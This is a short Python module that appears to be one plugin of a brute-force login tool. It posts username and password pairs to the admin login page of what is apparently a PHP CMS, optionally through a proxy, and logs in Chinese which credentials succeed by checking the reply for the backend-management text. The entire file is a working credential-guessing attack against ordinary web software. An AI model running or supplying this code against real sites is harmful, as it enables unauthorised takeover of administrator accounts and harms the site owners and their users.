import requests
import threading
from lib.log import MyLogger

threadingLock = threading.Lock()
def run(items):
    url,user_agent,proxy,username, password=items
    url=url.strip("/")
    logurl=url+'/index.php?case=admin&act=login&admin_dir=admin&site=default'
    header = {'User-Agent': user_agent}

    sesion = requests.session()
    data = {
        "submit": '%E6%8F%90%E4%BA%A4',
        "username": username,
        "password": password
    }

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = sesion.post(logurl, headers=header, data=data, proxies=proxies)
    else:
        response = sesion.post(logurl, headers=header, data=data)

    # print(loginResult)
    threadingLock.acquire()
    print(u'\r[#] 正在尝试凭据：'+username+"    "+password+' '*10,end='')
    # MyLogger.debug("正在尝试凭据："+username+" "+password)
    if response.status_code==200 and "后台管理" in response.text:
        MyLogger.success("有效凭据："+username+"    "+password)
        threadingLock.release()
        return {username:password}
    else:
        print(u'\r[#] 无效凭据：' + username + "    " + password+' '*10, end='')
        # MyLogger.debug("无效凭据："+username+" "+password)
        threadingLock.release()





